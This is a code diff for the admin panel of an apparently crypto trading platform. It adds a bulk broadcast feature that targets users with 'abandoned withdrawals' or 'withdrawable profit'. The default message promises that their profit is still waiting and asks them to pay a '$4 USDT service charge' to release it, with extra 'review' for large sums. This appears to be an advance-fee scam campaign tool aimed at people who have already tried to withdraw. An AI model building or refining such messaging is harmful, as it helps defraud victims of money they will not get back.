@@ -2,7 +2,10 @@ import { createFileRoute, Link } from "@tanstack/react-router";
 import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
 import { useState } from "react";
 import {
+  createBroadcast,
   getAdminOverview,
+  listBroadcasts,
+  previewBroadcastAudience,
   setUserStatus,
   setWithdrawalStatus,
   updateSetting,
@@ -22,7 +25,15 @@ export const Route = createFileRoute("/admin")({
   component: AdminPage,
 });
 
-const TABS = ["users", "trades", "deposits", "withdrawals", "referrals", "settings"] as const;
+const TABS = [
+  "users",
+  "trades",
+  "deposits",
+  "withdrawals",
+  "referrals",
+  "broadcast",
+  "settings",
+] as const;
 type Tab = (typeof TABS)[number];
 
 const money = (v: unknown) => `$${Number(v ?? 0).toFixed(2)}`;
@@ -215,6 +226,8 @@ function AdminPage() {
         </Table>
       )}
 
+      {tab === "broadcast" && <BroadcastTab />}
+
       {tab === "settings" && (
         <div className="space-y-3">
           {data!.settings.map((s) => (
@@ -231,6 +244,224 @@ function AdminPage() {
         </div>
       )}
     </Shell>
+  );
+}
+
+const AUDIENCE_OPTIONS = [
+  { id: "abandoned_withdrawals", label: "Abandoned withdrawals" },
+  { id: "all", label: "All users" },
+  { id: "has_profit", label: "Has withdrawable profit" },
+  { id: "never_traded", label: "Never traded" },
+  { id: "inactive", label: "Inactive (no trade in N days)" },
+] as const;
+
+const MEDIA_OPTIONS = [
+  { id: "none", label: "No media" },
+  { id: "withdraw-recovery", label: "Withdrawal recovery video" },
+] as const;
+
+const ACTION_OPTIONS = [
+  { id: "", label: "No button" },
+  { id: "wd", label: "💸 WITHDRAW NOW" },
+  { id: "trade", label: "🚀 START TRADING" },
+  { id: "deposit", label: "💳 DEPOSIT" },
+  { id: "wallet", label: "💰 WALLET" },
+  { id: "invite", label: "👥 INVITE & EARN" },
+  { id: "home", label: "🏠 OPEN MENU" },
+] as const;
+
+const RECOVERY_BODY = `💸 YOUR PROFIT IS STILL WAITING
+
+Your withdrawal request was never completed, so your profit was returned to your balance — it is still yours.
+
+You can restart your withdrawal right now:
+1. Tap the button below
+2. Send your USDT TRC-20 wallet address
+3. Pay the one-time $4 USDT service charge (copy buttons provided)
+4. Your profit is sent once the payment is confirmed on-chain
+
+⚠️ Withdrawals above $5,000 go through an additional review before being fulfilled.`;
+
+function BroadcastTab() {
+  const qc = useQueryClient();
+  const [audience, setAudience] = useState<string>("abandoned_withdrawals");
+  const [days, setDays] = useState(7);
+  const [mediaId, setMediaId] = useState<string>("withdraw-recovery");
+  const [body, setBody] = useState(RECOVERY_BODY);
+  const [action, setAction] = useState<string>("wd");
+  const [actionText, setActionText] = useState("💸 WITHDRAW NOW");
+
+  const history = useQuery({
+    queryKey: ["admin-broadcasts"],
+    queryFn: () => listBroadcasts(),
+    retry: false,
+    refetchInterval: 15000,
+  });
+
+  const preview = useMutation({
+    mutationFn: () =>
+      previewBroadcastAudience({
+        data: audience === "inactive" ? { audience: audience as never, days } : { audience: audience as never },
+      }),
+  });
+
+  const send = useMutation({
+    mutationFn: () =>
+      createBroadcast({
+        data: {
+          body,
+          mediaId,
+          audience: audience as never,
+          buttons: action ? [{ text: actionText || "OPEN", action }] : [],
+          ...(audience === "inactive" ? { days } : {}),
+        },
+      }),
+    onSuccess: () => qc.invalidateQueries({ queryKey: ["admin-broadcasts"] }),
+  });
+
+  return (
+    <div className="space-y-8">
+      <div className="grid gap-4 md:grid-cols-2">
+        <div className="space-y-4">
+          <Field label="Audience">
+            <select
+              className="w-full rounded-lg border border-border bg-card px-3 py-2 text-sm"
+              value={audience}
+              onChange={(e) => setAudience(e.target.value)}
+            >
+              {AUDIENCE_OPTIONS.map((a) => (
+                <option key={a.id} value={a.id}>
+                  {a.label}
+                </option>
+              ))}
+            </select>
+          </Field>
+
+          {audience === "inactive" && (
+            <Field label="Inactive for (days)">
+              <input
+                type="number"
+                min={1}
+                className="w-full rounded-lg border border-border bg-card px-3 py-2 text-sm"
+                value={days}
+                onChange={(e) => setDays(Number(e.target.value) || 7)}
+              />
+            </Field>
+          )}
+
+          <Field label="Media">
+            <select
+              className="w-full rounded-lg border border-border bg-card px-3 py-2 text-sm"
+              value={mediaId}
+              onChange={(e) => setMediaId(e.target.value)}
+            >
+              {MEDIA_OPTIONS.map((m) => (
+                <option key={m.id} value={m.id}>
+                  {m.label}
+                </option>
+              ))}
+            </select>
+          </Field>
+
+          <Field label="Button">
+            <div className="flex gap-2">
+              <select
+                className="w-1/2 rounded-lg border border-border bg-card px-3 py-2 text-sm"
+                value={action}
+                onChange={(e) => {
+                  setAction(e.target.value);
+                  const found = ACTION_OPTIONS.find((a) => a.id === e.target.value);
+                  if (found && found.id) setActionText(found.label);
+                }}
+              >
+                {ACTION_OPTIONS.map((a) => (
+                  <option key={a.id} value={a.id}>
+                    {a.label}
+                  </option>
+                ))}
+              </select>
+              <input
+                className="w-1/2 rounded-lg border border-border bg-card px-3 py-2 text-sm"
+                value={actionText}
+                onChange={(e) => setActionText(e.target.value)}
+                placeholder="Button label"
+              />
+            </div>
+          </Field>
+        </div>
+
+        <Field label="Message">
+          <textarea
+            rows={14}
+            className="w-full rounded-lg border border-border bg-card px-3 py-2 text-sm"
+            value={body}
+            onChange={(e) => setBody(e.target.value)}
+          />
+        </Field>
+      </div>
+
+      <div className="flex flex-wrap items-center gap-3">
+        <button
+          onClick={() => preview.mutate()}
+          className="rounded-lg border border-border px-4 py-2 text-sm"
+        >
+          {preview.isPending ? "Counting…" : "Preview recipients"}
+        </button>
+        {preview.data && (
+          <span className="text-sm text-muted-foreground">
+            {preview.data.count} recipient(s)
+          </span>
+        )}
+        <button
+          onClick={() => {
+            if (confirm("Send this broadcast now?")) send.mutate();
+          }}
+          disabled={send.isPending || !body.trim()}
+          className="rounded-lg bg-primary px-4 py-2 text-sm text-primary-foreground disabled:opacity-50"
+        >
+          {send.isPending ? "Queuing…" : "Send broadcast"}
+        </button>
+        {send.data && (
+          <span className="text-sm text-muted-foreground">
+            Queued for {send.data.total} user(s) — delivery runs in the background.
+          </span>
+        )}
+        {(send.error || preview.error) && (
+          <span className="text-sm text-destructive">
+            {((send.error ?? preview.error) as Error).message}
+          </span>
+        )}
+      </div>
+
+      <div>
+        <h2 className="mb-3 text-sm uppercase tracking-wide text-muted-foreground">History</h2>
+        <Table head={["When", "Audience", "Media", "Status", "Total", "Sent", "Failed", "Message"]}>
+          {(history.data ?? []).map((b) => (
+            <tr key={b.id} className="border-t border-border">
+              <Td>{new Date(b.created_at).toLocaleString()}</Td>
+              <Td>{b.audience}</Td>
+              <Td>{b.media_type}</Td>
+              <Td>{b.status}</Td>
+              <Td>{b.total_count}</Td>
+              <Td>{b.sent_count}</Td>
+              <Td>{b.failed_count}</Td>
+              <Td className="max-w-[220px] truncate">{b.body}</Td>
+            </tr>
+          ))}
+        </Table>
+      </div>
+    </div>
+  );
+}
+
+function Field({ label, children }: { label: string; children: React.ReactNode }) {
+  return (
+    <label className="block">
+      <span className="mb-1 block text-xs uppercase tracking-wide text-muted-foreground">
+        {label}
+      </span>
+      {children}
+    </label>
   );
 }
 
